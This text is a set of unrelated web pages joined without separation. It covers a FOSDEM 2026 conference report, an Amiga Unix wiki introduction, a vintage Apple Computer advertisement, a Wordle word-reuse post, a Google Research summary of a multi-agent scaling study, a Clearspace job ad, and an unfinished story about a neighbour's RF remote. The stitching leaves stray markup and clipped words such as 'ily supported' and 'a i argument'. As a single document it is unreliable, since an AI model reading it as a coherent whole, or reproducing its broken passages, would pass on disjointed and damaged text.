  &lt;main&gt;&lt;head rend="h1"&gt;FOSDEM 2026 – Open Source, Digital Sovereignty, and Europes Future&lt;/head&gt;():&lt;p&gt;FOSDEM, the Free and Open Source Developers’ European Meeting, is an annual pilgrimage for open source enthusiasts from all over the world. What started as a small gathering in 2000, originally named the Open Source Developers of Europe Meeting (OSDEM), has grown into one of the most significant conferences dedicated to free and open source software.&lt;/p&gt;&lt;p&gt;In 2026, FOSDEM felt more purposeful than ever. The conference clearly reflected a growing awareness around digital sovereignty and Europe’s technological future.&lt;/p&gt;&lt;p&gt;Self hosted solutions, open infrastructure, and community driven software were no longer niche topics. They were central to many discussions and presentations. The focus has visibly shifted away from convenience first and centralized platforms and toward systems that put control, transparency, and resilience back into the hands of users and communities. This shift was ily supported by established communities such as the FreeBSD project, which continues to demonstrate how long term, openly governed systems can serve as reliable foundations for sovereign infrastructure. At the same time, smaller but equally important projects showed how grassroots innovation drives real change. Talks like Hyacinthe’s FlipFlap presentation on the DN42 network highlighted decentralized and community operated networking in practice, while Emile’s talk on SmolBSD demonstrated how minimal, purpose built BSD systems can bring clarity, auditability, and long term maintainability back to operating system design. Projects such as BoxyBSD, crafted by gyptazy, showcased how lowering the barrier to learning BSD based systems empowers the next generation of open source contributors. By providing free invite codes during FOSDEM, BoxyBSD made hands on experimentation immediately accessible and reinforced the conference’s spirit of openness and community support.&lt;/p&gt;&lt;p&gt;FOSDEM 2026 made one thing unmistakably clear. Open source is no longer just about software freedom. It is increasingly about independence, sustainability, and Europe’s ability to shape its own digital future.&lt;/p&gt;&lt;head rend="h2"&gt;Arrival at FOSDEM 2026&lt;/head&gt;&lt;p&gt;Like every year, I decided to travel to FOSDEM by car. It’s actually the most relaxed way for me to get there as I can simply drive at any time in the morning, but it comes with one clear disadvantage: you have to arrive very early to secure a parking spot directly on campus. That means starting the journey long before the city fully wakes up. Overall, the travel time is more or less the same as taking the train, so that part doesn’t really matter. What does matter is the flexibility and being able to move around freely and head back home whenever I want. Since I usually only attend the first day of FOSDEM, that flexibility makes the early start worth it.&lt;/p&gt;&lt;p&gt;This year, the effort paid off once again. I ended up being the first car in line at the gate leading to the parking area. Better safe than sorry. Anyone who has attended FOSDEM knows that parking nearby is a small victory that can shape the rest of the day.&lt;/p&gt;&lt;p&gt;After parking, there was time to slow down a bit. Before the talks began, the campus gradually filled with familiar faces. FOSDEM has a unique rhythm in the early morning hours, when everything is still calm and conversations happen without rushing from room to room.&lt;/p&gt;&lt;p&gt;I met up with a few friends, and we took the opportunity to catch up and exchange a few thoughts before the day properly started. With coffees and croissants in hand, we waited for the opening talk. It was a simple moment, but one that perfectly captured the atmosphere of FOSDEM: a mix of anticipation, community, and shared curiosity about what the weekend would bring.&lt;/p&gt;&lt;head rend="h2"&gt;My Talk-Schedule at FOSDEM 2026&lt;/head&gt;&lt;p&gt;My personal schedule at FOSDEM followed a clear thread: understanding infrastructure from the lowest layers up to real-world, community operated systems. Rather than chasing trends, I focused on talks that explored control, reliability, and long term sustainability.&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Rust-VMM&lt;/item&gt;&lt;item&gt;Garage S3 Best Practices&lt;/item&gt;&lt;item&gt;Mobility of Virtual Machines in Kubernetes Clusters&lt;/item&gt;&lt;item&gt;SmolBSD&lt;/item&gt;&lt;item&gt;FlipFlap Network in DN42&lt;/item&gt;&lt;/list&gt;&lt;p&gt;The Rust-VMM talk set the tone by diving into modern virtualization foundations built with memory safety in mind. It highlighted how Rust enables a new generation of virtual machine monitors that reduce entire classes of bugs while still meeting strict performance requirements. For anyone working close to hardware or hypervisors, it was a i argument for rethinking traditional systems programming choices.&lt;/p&gt;&lt;p&gt;With Garage S3 Best Practices, the focus shifted from design to day-to-day operations. Object storage is often treated as a commodity, yet the talk made it clear how many subtle challenges exist around consistency, failure handling, and scaling. Real operational lessons and practical advice emphasized that running storage reliably is just as important as building it.&lt;/p&gt;&lt;p&gt;The talk on Mobility of Virtual Machines in Kubernetes Clusters explored the increasingly blurred line between classical virtualization and container orchestration. It showed how virtual machines can move and adapt within Kubernetes environments, combining the i isolation of VMs with the flexibility of cloud native tooling. This hybrid approach challenges the idea that platforms must choose one model exclusively.&lt;/p&gt;&lt;p&gt;SmolBSD brought a refreshing focus on minimalism. Instead of adding more layers, the project embraces small, understandable systems that are easier to audit and maintain over time. The talk reinforced the idea that simplicity is not a limitation but a strategic choice, especially for long lived infrastructure.&lt;/p&gt;&lt;p&gt;Finally, FlipFlap Network in DN42 connected many of the earlier themes through a community perspective. DN42 demonstrates how decentralized, self operated networking can work in practice. The talk showcased automation, experimentation, and cooperation in a real network built by its users, highlighting the educational and innovative power of grassroots infrastructure.&lt;/p&gt;&lt;p&gt;Together, these talks formed a coherent journey through modern open infrastructure: from safe low level building blocks to resilient storage, hybrid orchestration models, minimal operating systems, and community driven networks.&lt;/p&gt;&lt;head rend="h2"&gt;Best of...&lt;/head&gt;&lt;p&gt;One of my personal highlights of FOSDEM 2026 was a wonderfully simple yet brilliant idea by the Mozilla Foundation: giving away free cookies. It turned out to be more than just snacks. It was a fun little game, a great conversation starter, and the selection of cookies was genuinely excellent. You might have come for open source, but you probably left liking cookies even more than before.&lt;/p&gt;&lt;p&gt;Another standout moment was the talk The Challenges of FLOSS Office Suites by Michael Meeks, where he dove into the technical details behind Collabora Online. It was an absolute pleasure to listen to. What made the talk special was not only the depth of technical insight, but also the way it was presented. Complex topics were explained clearly, with context and humor, making it accessible without oversimplifying.&lt;/p&gt;&lt;p&gt;I was genuinely amazed by how the challenges of building and maintaining a full-featured, open source office suite were laid out so honestly. The talk went far beyond architecture diagrams and performance considerations and gave real insight into the long-term effort required to keep such critical software alive and competitive.&lt;/p&gt;&lt;p&gt;Beyond the talks, I also took the opportunity to have some great conversations at the booths. I chatted with fixoulab at the Proxmox booth and with the XCP-ng team at Vates, where I got an early look at the newly released Orchestra features. It was especially interesting since I had not yet found the time to dive into them in detail.&lt;/p&gt;&lt;p&gt;On a more personal note, I was truly grateful to meet many of my friends from different countries again. Being able to jump into great talks together, exchange impressions on the spot, and continue discussions afterwards is something that makes FOSDEM special in a way no recording or live stream ever could.&lt;/p&gt;&lt;head rend="h2"&gt;What the heck is going on at the FOSDEM 2026?&lt;/head&gt;&lt;p&gt;FOSDEM has always been crowded. Anyone who has attended more than once knows the familiar experience of packed hallways, full lecture rooms, and sprinting between buildings in the hope of catching the last five minutes of a talk. As the biggest open source conference in the world, this has long been part of its identity. But in 2026, it felt like something had shifted.&lt;/p&gt;&lt;p&gt;There is no doubt that the growing interest in free and open source software is a good thing. More people take open source seriously, more organizations depend on it, and more contributors want to get involved. That energy was clearly visible everywhere. At the same time, it felt like FOSDEM was reaching — or perhaps exceeding — its natural limits. Rooms filled faster than ever, informal discussions became harder to have, and the sheer density of people sometimes worked against the very openness the conference is known for.&lt;/p&gt;&lt;p&gt;A major driver behind this growth is the current political and economic climate. Topics like digital sovereignty, technological independence, and reducing reliance on a small number of dominant market players were more present than ever. This was not subtle. It was visible across the schedule, in hallway conversations, and especially during the Friday pre-conferences, where these themes were actively pursued and debated.&lt;/p&gt;&lt;p&gt;On one hand, this focus is both necessary and overdue. Open source has always been political in the sense that it is about control, transparency, and autonomy, even when it pretended not to be. Seeing these discussions move to the center stage at FOSDEM is encouraging. It shows that the community understands the stakes and is willing to engage with the broader implications of the technology it builds.&lt;/p&gt;&lt;p&gt;On the other hand, the intensity of this shift raises uncomfortable questions. When everything becomes urgent and strategic, the space for experimentation, learning, and smaller niche projects risks being squeezed out. Not every open source project exists to solve geopolitical problems, and not every contributor arrives with a policy agenda. FOSDEM has always thrived on its diversity of motivations, and maintaining that balance will be increasingly challenging.&lt;/p&gt;&lt;p&gt;FOSDEM 2026 felt like a conference at a crossroads. Its success is undeniable, but so are the growing pains that come with it. The challenge for the coming years will be finding ways to scale without losing what made the event special in the first place: accessibility, spontaneity, and the feeling that there is room for everyone and not just for the loudest or most timely topics. And while I already criticized this last year, this becomes even more important this year.&lt;/p&gt;&lt;p&gt;The conversations happening now are important, and it is good that they are happening at FOSDEM. But if the conference is to remain sustainable, both logistically and culturally, it will need to evolve just as thoughtfully as the open source ecosystem it represents.&lt;/p&gt;&lt;head rend="h2"&gt;Final Thoughts&lt;/head&gt;&lt;p&gt;It is genuinely great to see that FOSDEM remains free and open to everyone, even as the topics it covers become more complex and more relevant. The growing focus on moving away from big tech and reclaiming ownership of our data shows that the community is paying attention to what truly matters. These discussions are necessary, and it is encouraging to see them reflected so clearly in the talks and hallway conversations.&lt;/p&gt;&lt;p&gt;The quality of the talks was high, and the people were, as always, amazing. FOSDEM continues to be a place where curiosity, expertise, and openness meet. At the same time, the question of scale can no longer be ignored. Camping in front of a single room just to make sure you can attend a talk is not a sustainable solution. In many cases, it may even discourage the people who are genuinely interested but cannot afford to wait for hours or navigate overcrowded spaces.&lt;/p&gt;&lt;p&gt;For exactly this reason, I seriously considered staying home this year and watching the talks via live streams or recordings. From a purely technical perspective, that would have worked just fine. The content would still be there, accessible and well produced.&lt;/p&gt;&lt;p&gt;But in the end, FOSDEM is not just about talks. It is about meeting people, reconnecting with friends, and having spontaneous conversations that no video stream can fully replace. Seeing all of you again, sharing thoughts over coffee, and exchanging ideas in person ultimately mattered more than comfort or convenience.&lt;/p&gt;&lt;p&gt;FOSDEM 2026 once again proved why this conference is special. The challenge now is to ensure that it can continue to grow without losing the openness and accessibility that define it. That balance will shape what FOSDEM becomes in the years to come.&lt;/p&gt;&lt;/main&gt;

    &lt;p&gt;Welcome to the Amiga Unix wiki!&lt;/p&gt;
    &lt;p&gt;Amiga UNIX (also known as “Amix”) was Commodore's port of AT&amp;amp;T System V Release 4 Unix to the Amiga in 1990. Like many early Unix variants, Amiga Unix never became wildly popular, but it is an interesting sidestep in the history of the Amiga.&lt;/p&gt;
    &lt;p&gt;The two “official” machines that could run Amix were the Amiga 2500UX and 3000UX models, however it can run on any Amiga that meets its hardware requirements. The awesome Amiga emulator WinUAE has been able to run it since 2013 (version 2.7.0 onwards).&lt;/p&gt;
    &lt;p&gt;This site is dedicated on preserving Amix's history and sharing information and instructions on what Amix is, how to install it (either on real hardware or in emulation) and what can you do with it. Mainly, it tries to cater to people who wish to run AMIX for whatever reason on their hardware. By documenting experiences with it, it is hoped that subsequent SVR4 junkies will find the way more smooth than it might have been without any guidance at all. For even a relatively experienced modern Unix or GNU/Linux administrator, System V UNIX is sufficiently different to present difficulty in installation and administration. Not so much in moving around between directories, and using common utilities that persist to this day - although many of those are hoary and somewhat forgetful in their retirement - but of doing more in depth tasks and understanding the differences.&lt;/p&gt;

      &lt;item&gt;Old, and riddled with Spam, but there once was a thriving Newsgroup dedicated to Amiga Unix. Seeing the Internet “never forgets”, you can find the old discussions at Google Groups: https://groups.google.com/forum/#!forum/comp.unix.amiga&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Where to get help with Amix?&lt;/p&gt;
    &lt;p&gt;Currently the most active Amix-related forum seems to be support.Amix @ English Amiga Board. Ask there if you need any help!&lt;/p&gt;
    &lt;p&gt;Wanted: content for this site! Do you have a piece of third-party software for Amix? Copy of an exotic hardware driver? Would you like to help write guides? Have copy of files from litamiga.epfl.ch or amiga.physik.unizh.ch? Please let us know!&lt;/p&gt;
    &lt;p&gt;Why would you like to try Amix? The short answer is, you don't want it. Stay with me for just a minute here.&lt;/p&gt;
    &lt;p&gt;Amiga UNIX is really, really real UNIX. AT&amp;amp;T System V Release 4, ported by a team at Commodore that quit the day that 1.0 was released - at least, as legend has it. All the releases have their share of issues, and none of them have been updated in well over a decade. It runs on old hardware that was expensive when new and hard enough to find now that “RARE!” tags on eBay aren't hyperbole for once. You can cheat and get it installed without the tape drive, at least, but it's not for the faint of heart and has its own caveats such as a completely broken package system.&lt;/p&gt;
    &lt;p&gt;Think for a minute about your goals before embarking on this journey. If you're a die-hard Amiga user - and we all know they are still out there - interested in trying this UNIX thing, because you've heard about Mac OS X and that's based on UNIX, but before you swap out Kickstart for init you'd like to kick the tires on Amiga UNIX…&lt;/p&gt;
    &lt;p&gt;Don't.&lt;/p&gt;
    &lt;p&gt;Ten minutes with Amiga UNIX will have some Amiga users reaching for their 3.1 floppies. Actually, two minutes with the installer might have the same effect. That's just not fair to UNIX, whether it's GNU/Linux, Solaris, FreeBSD, or whatever. The environment has come a long way in the years and years since Amiga UNIX was shiny and new, rather than bitter and tarnished. Your average Ubuntu user will have set fire to their house trying to expunge any evidence of the unforgiving AMIX installation. Did I mention it hasn't been updated in a decade? Put your Amiga UNIX machine on the net with no firewall and you may see it rooted faster than a Win98SE box running IE5.&lt;/p&gt;
    &lt;p&gt;Finally, and this is a biggie, there is no future for AMIX. Its kernel, libc, and much of its software is closed source, so when Commodore folded its story was over. It was put to pasture even as free UNIX environments began to be truly plausible contenders for commercial UNIX, and largely forgotten.&lt;/p&gt;
    &lt;p&gt;So this is quite the happy page, isn't it? Why would you want to install AMIX?&lt;/p&gt;
    &lt;p&gt;There's really only one reason. Well, two, if you count being an idiot like us. That reason is simple curiosity. If you'd like to put yourself in the shoes of an aspiring systems programmer in the early nineties, go for it. If you find the legacy of the ever growing open source operating system revolution fascinating, AMIX could prove instructive. If you're trying to impress bearded UNIX gurus with arcane knowledge from the times when men were men, and 16MB was a ton of RAM, the dwindling lore of System V might be the key. These days, Amiga UNIX is all about history and learning.&lt;/p&gt;
    &lt;p&gt;So if you have the requisite hardware and you have girded yourself for what is in store for you should you venture into the m68k-cbm-sysv4 dungeon, you might enjoy this site and the dusty treasures it contains. But seriously, if you just want to try UNIX or GNU/Linux out, the most expedient way to do it is on x86 or just something better supported on Amiga hardware. There are lots of choices for you.&lt;/p&gt;
    &lt;p&gt;Good luck, and enjoy!&lt;/p&gt;

        &lt;p&gt; The Apple Computer. A truly complete microcomputer system on a single PC board. Based on the MOS Technology 6502 micro- processor, the Apple also has a built-in video terminal and sockets for 8K bytes of onboard RAM memory. With the addition of a keyboard and video monitor, you'll have an extremely powerful computer system that can be used for anything from developing programs to playing games or running BASIC.&lt;lb/&gt; Combining the computer, video terminal and dynamic memory on a single board has resulted in a large reduction in chip count, which means more reliability and lowered cost. Since the Apple comes fully assembled, tested &amp;amp; burned-in and has a complete power supply on-board, initial set-up is essentially "hassle-free" and you can be running within minutes. At $666.66 (including 4K bytes RAM!) it opens many new possibilities for users and systems manufacturers.&lt;/p&gt;
        &lt;p&gt;You Don't Need an Expensive Teletype.&lt;lb/&gt; Using the built-in video terminal and keyboard interface, you avoid all the expense, noise and mantenance associated with a teletype. And the Apple video terminal is six times faster than a teletype, which means more throughput and less waiting. The Apple connects directly to a video monitor (or home TV with an in- expensive RF modulator) and dis- plays 960 easy to read characters in 24 rows of 40 characters per line with automatic scrolling. The video display section contains its own 1K bytes of memory, so all the RAM memory is available for user programs. And the &lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell valign="TOP" width="210"&gt;
        &lt;p&gt;Keyboard Interface lets you use almost any ASCII-encoded keyboard.&lt;lb/&gt; The Apple Computer makes it possible for many people with limited budgets to step up to a video terminal as an I/O device for their computer.&lt;/p&gt;
        &lt;p&gt;No More Switches,&lt;lb/&gt; No MoreLights&lt;lb/&gt; Compared to switches and LED's, a video terminal can dis- play vast amounts of information simultaneously. The Apple video terminal can display the contents of 192 memory locations at once on the screen. And the fimrware in PROMS enables you to enter,display and debug programs (all in hex) from the keyboard, ren- dering a front panel unnecessary. The firmware also allows your programs to print characters on the display, and since you'll be looking at letters and numbers instead of just LED's, the door is open to all kinds of alphanumeric software (i.e., Games and BASIC).&lt;/p&gt;
        &lt;p&gt;8K Bytes RAM in 16 Chips!&lt;lb/&gt; The Apple Computer uses the new 16-pin 4K dynamic memory chips. They are faster and take 1/4 the space and power of even the low power 2102's (the memory chip that everyone else uses). That means 8K bytes in sixteen chips. It also means no more 28 amp power supplies. The system is fully expandable to 65K via an edge connector which carries both the address and data busses, power supplies and all timing signals. All dy- namic memory refreshing for both on and off-board memory is done automatically. Also, the Apple Computer can be upgraded to use the 16K chips when they become availa- &lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell valign="TOP" width="210"&gt;
        &lt;p&gt;ble. That's 32K bytes on-board RAM in 16 IC's --the equivalent of 256 2102's!&lt;/p&gt;
        &lt;p&gt;A little Cassette Board that Works!&lt;lb/&gt; Unlike many other cassette boards on the marketplace,ours works every timeIt plugs directly into the upright connector on the mainboard and stands only 2" tall.And since it is very fast (1500 bits per second), you can read or write 4 K bytes in about 20 seconds.All timing is done in software, witch results in crystal-controlled accuracy and uniformity from unit to unit.&lt;lb/&gt; unlike some other cassette interfaces witch requires an expensive tape recorder, the Apple Cassette Interface works reliably with almost any audio-grade cassette recorder.&lt;/p&gt;
        &lt;p&gt;Softwares&lt;lb/&gt; A tape of APPLE BASIC is inclued free with the Cassette Interface.Apple Basic features immediate error message and fast execution, and let's you program in a highter level language immediately and without added cost.Also avialable now are a dis-assembler and many games, with many software packages,(including a macro assembler) in the works.And since our philosophy is to provide software for our machines free or at minimal cost, you won't be continually paying for access to this growing software library.&lt;lb/&gt; The Apple Computer is in stock al almost all major computer stores.(if your local computer store doesn't carry our products, encourage them or write us direct).Dealer inquiries invited. &lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;

    &lt;head rend="h1"&gt;A Crisis comes to Wordle: Reusing old words!&lt;/head&gt;
    &lt;p&gt;A few days ago, The new York Times (owner of Wordle) announced that from 2 February it would start reusing some words from previous years.&lt;/p&gt;
    &lt;p&gt;Their announcement started:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Hey, Wordlers! We have some exciting news to share&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;and continued&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Starting on Monday, we will begin adding previously run words back into play. There are still many first-time answers to debut, but also more chances for Wordle in ones and those magical, serendipitous moments when Wordle overlaps with real life. Happy solving!&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Firstly, whoever wrote this nonsense deserves an award for fake cheerfulness. There is absolutely no "exciting news" in that paragraph.&lt;/p&gt;
    &lt;p&gt;It has caused a bit of a stir in the Wordle Community. Many wondering why, and some suggesting they will now stop playing the dumbed down version.&lt;/p&gt;
    &lt;head rend="h2"&gt;It got me thinking&lt;/head&gt;
    &lt;p&gt;Are they running out of five-letter words? I've gathered the data and crunched the numbers, and here are my findings:&lt;/p&gt;
    &lt;p&gt;Firstly, I started with a list of English words. I've actually had a list for some time, and I knew one day it would come in useful. It contains 466,547 words: from aahed 1 to zugzwang 2.&lt;/p&gt;
    &lt;p&gt;I then narrowed that down to five-letter words (22,949) before excluding plurals, which are not used in Wordle, and Proper Nouns (such as Paris, or March -- anything with uppercase first letter, but leaving "march" for example). The list was down to 10,784 words.&lt;/p&gt;
    &lt;p&gt;Finally, one more trip through the sausage machine. I put this list in a word processor and calculated how many spelling errors there were. This, roughly, would help me identify the more common five-letter words. I doubt many of us could use valew 3 in a sentence.&lt;/p&gt;
    &lt;p&gt;We now have a more manageable potential Wordle list of 5,437 words.&lt;/p&gt;
    &lt;head rend="h2"&gt;The longevity of five-thousand words?&lt;/head&gt;
    &lt;p&gt;A word-a-day from that list would yield almost 15 years of daily challenges. Wordle has been running since October 2021. By my reckoning we have enough to run until 2036&lt;/p&gt;
    &lt;head rend="h2"&gt;NYT, Why?&lt;/head&gt;
    &lt;p&gt;So that does beg the question: New York Times - why start repeating?&lt;/p&gt;

    &lt;head rend="h1"&gt;Towards a science of scaling agent systems: When and why agent systems work&lt;/head&gt;
    &lt;p&gt;January 28, 2026&lt;/p&gt;
    &lt;p&gt;Yubin Kim, Research Intern, and Xin Liu, Senior Research Scientist, Google Research&lt;/p&gt;
    &lt;p&gt;Through a controlled evaluation of 180 agent configurations, we derive the first quantitative scaling principles for AI agent systems, revealing that multi-agent coordination dramatically improves performance on parallelizable tasks but degrades it on sequential ones; we also introduce a predictive model that identifies the optimal architecture for 87% of unseen tasks.&lt;/p&gt;
    &lt;head rend="h2"&gt;Quick links&lt;/head&gt;
    &lt;p&gt;AI agents — systems capable of reasoning, planning, and acting — are becoming a common paradigm for real-world AI applications. From coding assistants to personal health coaches, the industry is shifting from single-shot question answering to sustained, multi-step interactions. While researchers have long utilized established metrics to optimize the accuracy of traditional machine learning models, agents introduce a new layer of complexity. Unlike isolated predictions, agents must navigate sustained, multi-step interactions where a single error can cascade throughout a workflow. This shift compels us to look beyond standard accuracy and ask: How do we actually design these systems for optimal performance?&lt;/p&gt;
    &lt;p&gt;Practitioners often rely on heuristics, such as the assumption that "more agents are better", believing that adding specialized agents will consistently improve results. For example, "More Agents Is All You Need" reported that LLM performance scales with agent count, while collaborative scaling research found that multi-agent collaboration "...often surpasses each individual through collective reasoning."&lt;/p&gt;
    &lt;p&gt;In our new paper, “Towards a Science of Scaling Agent Systems”, we challenge this assumption. Through a large-scale controlled evaluation of 180 agent configurations, we derive the first quantitative scaling principles for agent systems, revealing that the "more agents" approach often hits a ceiling, and can even degrade performance if not aligned with the specific properties of the task.&lt;/p&gt;
    &lt;head rend="h2"&gt;Defining "agentic" evaluation&lt;/head&gt;
    &lt;p&gt;To understand how agents scale, we first defined what makes a task "agentic". Traditional static benchmarks measure a model's knowledge, but they don't capture the complexities of deployment. We argue that agentic tasks require three specific properties:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Sustained multi-step interactions with an external environment.&lt;/item&gt;
      &lt;item&gt;Iterative information gathering under partial observability.&lt;/item&gt;
      &lt;item&gt;Adaptive strategy refinement based on environmental feedback.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We evaluated five canonical architectures: one single-agent system (SAS) and four multi-agent variants (independent, centralized, decentralized, and hybrid) across four diverse benchmarks, including Finance-Agent (financial reasoning), BrowseComp-Plus (web navigation), PlanCraft (planning), and Workbench (tool use). The agent architectures are defined as follow:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Single-Agent (SAS): A solitary agent executing all reasoning and acting steps sequentially with a unified memory stream.&lt;/item&gt;
      &lt;item&gt;Independent: Multiple agents working in parallel on sub-tasks without communicating, aggregating results only at the end.&lt;/item&gt;
      &lt;item&gt;Centralized: A "hub-and-spoke" model where a central orchestrator delegates tasks to workers and synthesizes their outputs.&lt;/item&gt;
      &lt;item&gt;Decentralized: A peer-to-peer mesh where agents communicate directly with one another to share information and reach consensus.&lt;/item&gt;
      &lt;item&gt;Hybrid: A combination of hierarchical oversight and peer-to-peer coordination to balance central control with flexible execution.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Results: The myth of "more agents"&lt;/head&gt;
    &lt;p&gt;To quantify the impact of model capabilities on agent performance, we evaluated our architectures across three leading model families: OpenAI GPT, Google Gemini, and Anthropic Claude. The results reveal a complex relationship between model capabilities and coordination strategy. As shown in the figure below, while performance generally trends upward with more capable models, multi-agent systems are not a universal solution — they can either significantly boost or unexpectedly degrade performance depending on the specific configuration.&lt;/p&gt;
    &lt;p&gt;The results below compare the performance of the five architectures across different domains, such as web browsing and financial analysis. The box plots represent the accuracy distribution for each approach, while the percentages indicate the relative improvement (or decline) of multi-agent teams compared to the single-agent baseline. This data highlights that while adding agents can drive massive gains in parallelizable tasks, it can often lead to diminishing returns — or even performance drops — in more sequential workflows.&lt;/p&gt;
    &lt;head rend="h3"&gt;The alignment principle&lt;/head&gt;
    &lt;p&gt;On parallelizable tasks like financial reasoning (e.g., distinct agents can simultaneously analyze revenue trends, cost structures, and market comparisons), centralized coordination improved performance by 80.9% over a single agent. The ability to decompose complex problems into sub-tasks allowed agents to work more effectively.&lt;/p&gt;
    &lt;head rend="h3"&gt;The sequential penalty&lt;/head&gt;
    &lt;p&gt;Conversely, on tasks requiring strict sequential reasoning (like planning in PlanCraft), every multi-agent variant we tested degraded performance by 39-70%. In these scenarios, the overhead of communication fragmented the reasoning process, leaving insufficient "cognitive budget" for the actual task.&lt;/p&gt;
    &lt;head rend="h3"&gt;The tool-use bottleneck&lt;/head&gt;
    &lt;p&gt;We identified a "tool-coordination trade-off". As tasks require more tools (e.g., a coding agent with access to 16+ tools), the "tax" of coordinating multiple agents increases disproportionately.&lt;/p&gt;
    &lt;head rend="h2"&gt;Architecture as a safety feature&lt;/head&gt;
    &lt;p&gt;Perhaps most important for real-world deployment, we found a relationship between architecture and reliability. We measured error amplification, the rate at which a mistake by one agent propagates to the final result.&lt;/p&gt;
    &lt;p&gt;We found that independent multi-agent systems (agents working in parallel without talking) amplified errors by 17.2x. Without a mechanism to check each other's work, errors cascaded unchecked. Centralized systems (with an orchestrator) contained this amplification to just 4.4x. The orchestrator effectively acts as a "validation bottleneck", catching errors before they propagate.&lt;/p&gt;
    &lt;head rend="h2"&gt;A predictive model for agent design&lt;/head&gt;
    &lt;p&gt;Moving beyond retrospection, we developed a predictive model (R^2 = 0.513) that uses measurable task properties like tool count and decomposability to predict which architecture will perform best. This model correctly identifies the optimal coordination strategy for 87% of unseen task configurations.&lt;/p&gt;
    &lt;p&gt;This suggests we are moving toward a new science of agent scaling. Instead of guessing whether to use a swarm of agents or a single powerful model, developers can now look at the properties of their task, specifically its sequential dependencies and tool density, to make principled engineering decisions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;As foundational models like Gemini continue to advance, our research suggests that smarter models don't replace the need for multi-agent systems, they accelerate it, but only when the architecture is right. By moving from heuristics to quantitative principles, we can build the next generation of AI agents that are not just more numerous, but smarter, safer, and more efficient.&lt;/p&gt;

    &lt;p&gt;Eliminate compulsive phone usage&lt;/p&gt;
    &lt;p&gt;About Clearspace&lt;/p&gt;
    &lt;p&gt;Clearspace is building the intentionality layer of the internet. Our mission is to build technology as effective at protecting human attention as social media is at exploiting it (infinite scrolling, short-form feeds, manipulative notifications, etc). Our category defining mobile app has been featured on Huberman Lab, New York Times Wirecutter, NPR Marketplace, Forbes, TBPN.&lt;/p&gt;
    &lt;p&gt;People that want a better relationship with their devices have nowhere to turn except for willpower. We are building an agent that achieves this on all devices by processing and filtering network traffic based on natural language rules.&lt;/p&gt;
    &lt;p&gt;About The Role&lt;/p&gt;
    &lt;p&gt;We are looking for an ML-focused engineer that will be responsible for training and improving a model for classifying network traffic. You are great for this role if you are not only excited about the latest in AI and ML but are also a problem-solver in the data domain. You don’t just think about the model but “how can we get more data volume”; “how can we featurize the data intelligently”; “what are our data needs based on our task and desired model size”, and like building backwards from inference requirements.&lt;/p&gt;
    &lt;p&gt;Responsibilities&lt;/p&gt;
    &lt;p&gt;Qualifications&lt;/p&gt;
    &lt;p&gt;Nice to Have&lt;/p&gt;
    &lt;p&gt;At Clearspace we help people reduce compulsive phone usage.&lt;/p&gt;
    &lt;p&gt;We exist to protect people's attention from the exploits of modern technology platforms and make space for the things that matter to them most.&lt;/p&gt;
    &lt;p&gt;We believe the technology to protect someones attention should be just as sophisticated and effective as the tech that is exploiting it and are building a world-class engineering team to arm the world with a comprehensive attention protection stack.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;When I moved to a new apartment with my family, the cable company we were used to wasn't available. We had to settle for Dish Network. I wasn't too happy about making that switch, but something on their website caught my attention. For an additional $5 a month, I could have access to DVR. I switched immediately.&lt;/p&gt;
    &lt;p&gt;This was 2007. DVR was not new, but it wasn't commonly bundled with set-top boxes. TiVo was still the popular way to record, pause, and rewind live TV. We received two set-top boxes, one for each room with a TV, and three remotes. Two remotes had IR (infrared) blasters and, surprisingly, one RF (radio frequency) remote.&lt;/p&gt;
    &lt;p&gt;After using the RF remote, I wondered: Why would anyone ever use an IR remote again? You didn't need a direct line of sight with the device you were controlling. I could actually stand in the kitchen and control the TV. It was amazing. But with the convenience of RF came other problems that IR users never had to worry about. Interference.&lt;/p&gt;
    &lt;p&gt;After several months of enjoying my service, one of my neighbors, the loudest in the building, also switched to Dish Network. And he also got the RF remote. This was the type of neighbor who would leave the house with the TV on, volume blasting.&lt;/p&gt;
    &lt;p&gt;One day, I was in the living room watching TV when the channel just flipped. I must have accidentally hit a button, so I changed it back. But not a few seconds later, the channel changed again. Then the volume went up. I figured my sister must have had the RF remote and was messing with me. But no, the remote was in my hand. I assumed something was wrong with it.&lt;/p&gt;
    &lt;p&gt;The whole time I was watching TV, the channels kept randomly switching. I banged the remote on the table a couple of times, but it still switched. I removed the batteries from the remote, it still switched. I unplugged the device for a few minutes, plugged it back in, and… it still switched. Frustrated, I went through the device settings and disabled the RF remote. That's when it finally stopped. I wasn't happy with this solution, but it allowed me to watch TV until I figured something out.&lt;/p&gt;
    &lt;p&gt;One evening, when everyone was asleep and the neighbor was watching a loud TV show, I decided to diagnose the issue. The moment I pressed the power button on the RF remote, my TV and set-top box turned on, and the neighbor's TV went silent. "Fuck!" I heard someone say. I was confused. Did I just do that? The TV turned back on, the volume went up. I walked to the window armed with the remote. I counted to three, then pressed the power button. My neighbor's TV went silent. He growled.&lt;/p&gt;
    &lt;p&gt;I am the captain now.&lt;/p&gt;
    &lt;p&gt;Every time he turned the TV on, I pressed the power button again and his device went off. Well, what do you know? We had interference somehow. Our remotes were set up to operate at the same frequency. Each remote controlled both devices.&lt;/p&gt;
    &lt;p&gt;But I'm not that kind of neighbor. I wasn't going to continue to mess with him. Instead, I decided I would pay him a visit in the morning and explain that our remotes are tuned to the same frequency. I would bring the RF remote with me just to show him a demo. I was going to be a good neighbor.&lt;/p&gt;
    &lt;p&gt;In the morning, I went downstairs, remote in hand. I knocked on the door, and a gentleman in his forties answered the door. I had rehearsed my speech and presentation. This would be a good opportunity to build a good rapport, and have a shared story. Maybe he would tell me how he felt when the TV went off. How he thought there was a ghost in the house or something. But that's not what happened.&lt;/p&gt;
